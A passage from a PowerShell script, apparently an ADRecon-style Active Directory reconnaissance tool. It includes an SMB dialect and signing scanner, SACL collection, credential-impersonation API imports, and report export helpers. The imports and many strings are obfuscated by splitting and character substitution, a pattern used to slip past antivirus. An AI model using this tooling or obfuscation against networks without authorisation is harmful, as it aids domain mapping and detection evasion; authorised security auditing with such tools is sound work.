                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

# modified version from https://github.com/vletoux/SmbScanner/blob/master/smbscanner.ps1
$PingCastleSMBScannerSource = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@

# Import the LogonUser, ImpersonateLoggedOnUser and RevertToSelf Functions from advapi32.dll and the CloseHandle Function from kernel32.dll
# https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Add-Type?view=powershell-5.1
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379317(v=vs.85).aspx

$Advapi32Def = (('9YC
   '+' ['+'D'+'llI'+'m'+'port'+'('+'Ow5a'+'dvap'+'i32.dllOw5, SetLastErr'+'o'+'r '+'= '+'t'+'rue)'+']
'+'    '+'publ'+'ic'+' stati'+'c e'+'xt'+'ern b'+'ool Log'+'onU'+'ser'+'(st'+'r'+'ing lpszUserna'+'me, stri'+'ng '+'lps'+'zDomai'+'n'+', st'+'rin'+'g'+' lpszPass'+'word, '+'int dwLo'+'g'+'onTyp'+'e, '+'i'+'nt'+' '+'dw'+'Log'+'on'+'Provi'+'der,'+' out IntP'+'tr phT'+'oken);'+'

   '+' [Dl'+'lI'+'m'+'p'+'or'+'t('+'Ow5'+'ad'+'vapi'+'32'+'.d'+'llOw5, '+'Set'+'L'+'a'+'stEr'+'ro'+'r '+'='+' true)]
    pu'+'blic s'+'tat'+'ic '+'ext'+'ern'+' bool '+'Imp'+'er'+'so'+'na'+'teLoggedO'+'nU'+'s'+'e'+'r(IntP'+'t'+'r'+' h'+'T'+'ok'+'en'+')'+';

 '+'   [DllImport(Ow5advapi'+'32.dllOw5'+', '+'S'+'etL'+'as'+'tEr'+'r'+'or = true)]
'+'   '+' publ'+'ic stati'+'c ext'+'ern'+' b'+'ool'+' Rever'+'t'+'ToSe'+'lf'+'()'+';
9YC')  -crEpLACE  'Ow5',[CHaR]34 -crEpLACE  ([CHaR]57+[CHaR]89+[CHaR]67),[CHaR]39)

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx

$Kernel32Def = (('ce1
'+'    '+'[DllIm'+'p'+'o'+'rt(kTAke'+'r'+'nel32.dll'+'k'+'TA'+','+' Se'+'tLastE'+'rr'+'o'+'r = '+'t'+'rue)]
  '+'  p'+'ubl'+'ic stat'+'i'+'c'+' ex'+'tern bool Close'+'Handle(IntPt'+'r hOb'+'ject);'+'
c'+'e1') -CrePLace  ([ChAR]107+[ChAR]84+[ChAR]65),[ChAR]34 -rePLACE'ce1',[ChAR]39)

Function Get-DateDiff
{
<#
.SYNOPSIS
    Get difference between two dates.

.DESCRIPTION
    Returns the difference between two dates.

.PARAMETER Date1
    [DateTime]
    Date

.PARAMETER Date2
    [DateTime]
    Date

.OUTPUTS
    [System.ValueType.TimeSpan]
    Returns the difference between the two dates.
#>
    param (
        [Parameter(Mandatory = $true)]
        [DateTime] $Date1,

        [Parameter(Mandatory = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function Get-DNtoFQDN
{
<#
.SYNOPSIS
    Gets Domain Distinguished Name (DN) from the Fully Qualified Domain Name (FQDN).

.DESCRIPTION
    Converts Domain Distinguished Name (DN) to Fully Qualified Domain Name (FQDN).

.PARAMETER ADObjectDN
    [string]
    Domain Distinguished Name (DN)

.OUTPUTS
    [String]
    Returns the Fully Qualified Domain Name (FQDN).

.LINK
    https://adsecurity.org/?p=440
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.IndexOf(('DC'+'='))
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.SubString($Index)) -replace ('DC'+'='),'' -replace ',','.'
    }
    Else
    {
        # Modified version from https://adsecurity.org/?p=440
        [array] $ADObjectDNArray = $ADObjectDN -Split (('D'+'C='))
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.Substring(1, $ADObjectDNArrayItemDomainName.Length - 2)
    }
    Return $ADObjectDNDomainName
}

Function Export-ADRCSV
{
<#
.SYNOPSIS
    Exports Object to a CSV file.

.DESCRIPTION
    Exports Object to a CSV file using Export-CSV.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the CSV File.

.OUTPUTS
    CSV file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation -Encoding Default
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRXML
{
<#
.SYNOPSIS
    Exports Object to a XML file.

.DESCRIPTION
    Exports Object to a XML file using Export-Clixml.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the XML File.

.OUTPUTS
    XML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).Save($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRJSON
{
<#
.SYNOPSIS
    Exports Object to a JSON file.

.DESCRIPTION
    Exports Object to a JSON file using ConvertTo-Json.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the JSON File.

.OUTPUTS
    JSON file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADRHTML
{
<#
.SYNOPSIS
    Exports Object to a HTML file.

.DESCRIPTION
    Exports Object to a HTML file using ConvertTo-Html.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the HTML File.

.OUTPUTS
    HTML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(Mandatory = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.Contains(('In'+'dex')))
        {
            $HTMLPath  = -join($ADROutputDir,'\',('HTM'+'L'+'-Files'))
            $HTMLPath = $((Convert-Path $HTMLPath).TrimEnd("\"))
            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title ('AD'+'Re'+'con') -Property @{Label=('Ta'+'ble of Conte'+'nt'+'s');Expression={"<a href='$($_)'>$($_)</a> "}} -Head $Header

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object * | ConvertTo-HTML -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function Export-ADR
{
<#
.SYNOPSIS
    Helper function for all output types supported.

.DESCRIPTION
    Helper function for all output types supported.

.PARAMETER ADObjectDN
    [PSObject]
    ADRObj

.PARAMETER ADROutputDir
    [String]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRModuleName
    [String]
    Module Name.

.OUTPUTS
    STDOUT, CSV, XML, JSON and/or HTML file, etc.
#>
    param(
        [Parameter(Mandatory = $true)]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [String] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        ('STD'+'OUT')
        {
            If ($ADRModuleName -ne ('Ab'+'outADReco'+'n'))
            {
                If ($ADRObj -is [array])
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Out-String -Stream
                }
                Else
                {
                    # Fix for InvalidOperationException: The object of type "Microsoft.PowerShell.Commands.Internal.Format.FormatStartData" is not valid or not in the correct sequence.
                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        ('C'+'SV')
        {
            $ADFileName  = -join($ADROutputDir,'\',('CSV-'+'Files'),'\',$ADRModuleName,('.c'+'sv'))
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ('XM'+'L')
        {
            $ADFileName  = -join($ADROutputDir,'\',('XM'+'L-'+'Files'),'\',$ADRModuleName,('.'+'xml'))
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ('JS'+'ON')
        {
            $ADFileName  = -join($ADROutputDir,'\',('JSON'+'-'+'Files'),'\',$ADRModuleName,('.js'+'on'))
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ('H'+'TML')
        {
            $ADFileName  = -join($ADROutputDir,'\',('HTML-F'+'il'+'es'),'\',$ADRModuleName,('.'+'html'))
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{
<#
.SYNOPSIS
    Creates a ComObject to interact with Microsoft Excel.

.DESCRIPTION
    Creates a ComObject to interact with Microsoft Excel if installed, else warning is raised.

.OUTPUTS
    [System.__ComObject] and [System.MarshalByRefObject]
    Creates global variables $excel and $workbook.
#>

    #Check if Excel is installed.
    Try
    {
        # Suppress verbose output
        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = ('SilentlyC'+'o'+'ntin'+'ue')
        $global:excel = New-Object -ComObject excel.application
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning ('[Get-ADREx'+'celComObj] Excel '+'do'+'e'+'s not appear to be inst'+'a'+'lled. S'+'kip'+'ping ge'+'nera'+'tion o'+'f ADR'+'ec'+'on-R'+'ep'+'o'+'rt.xlsx. Use '+'the -G'+'enExcel parameter to '+'generate the '+'ADRecon-Repor'+'t'+'.xslx on a '+'h'+'o'+'s'+'t with M'+'icrosoft '+'Excel'+' i'+'nstall'+'ed.')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    $excel.Visible = $true
    $excel.Interactive = $false
    $global:workbook = $excel.Workbooks.Add()
    If ($workbook.Worksheets.Count -eq 3)
    {
        $workbook.WorkSheets.Item(3).Delete()
        $workbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{
<#
.SYNOPSIS
    Releases the ComObject created to interact with Microsoft Excel.

.DESCRIPTION
    Releases the ComObject created to interact with Microsoft Excel.

.PARAMETER ComObjtoRelease
    ComObjtoRelease

.PARAMETER Final
    Final
#>
    param(
        [Parameter(Mandatory = $true)]
        $ComObjtoRelease,

        [Parameter(Mandatory = $false)]
        [bool] $Final = $false
    )
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.releasecomobject(v=vs.110).aspx
    # https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshal.finalreleasecomobject(v=vs.110).aspx
    If ($Final)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject($ComObjtoRelease) | Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ComObjtoRelease) | Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{
<#
.SYNOPSIS
    Adds a WorkSheet to the Workbook.

.DESCRIPTION
    Adds a WorkSheet to the Workbook using the $workboook global variable and assigns it a name.

.PARAMETER name
    [string]
    Name of the WorkSheet.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $name
    )

    $workbook.Worksheets.Add() | Out-Null
    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Name = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{
<#
.SYNOPSIS
    Helper to import CSV to the current WorkSheet.

.DESCRIPTION
    Helper to import CSV to the current WorkSheet. Supports two methods.

.PARAMETER ADFileName
    [string]
    Filename of the CSV file to import.

.PARAMETER method
    [int]
    Method to use for the import.

.PARAMETER row
    [int]
    Row.

.PARAMETER column
    [int]
    Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ADFileName,

        [Parameter(Mandatory = $false)]
        [int] $Method = 1,

        [Parameter(Mandatory = $false)]
        [int] $row = 1,

        [Parameter(Mandatory = $false)]
        [int] $column = 1
    )

    $excel.ScreenUpdating = $false
    If ($Method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook.Worksheets.Item(1)
            $TxtConnector = (('TEX'+'T;') + $ADFileName)
            $CellRef = $worksheet.Range('A1')
            #Build, use and remove the text file connector
            $Connector = $worksheet.QueryTables.add($TxtConnector, $CellRef)

            #65001: Unicode (UTF-8)
            $worksheet.QueryTables.item($Connector.name).TextFilePlatform = 65001
            $worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
            $worksheet.QueryTables.item($Connector.name).TextFileParseType = 1
            $worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
            $worksheet.QueryTables.item($Connector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable Connector

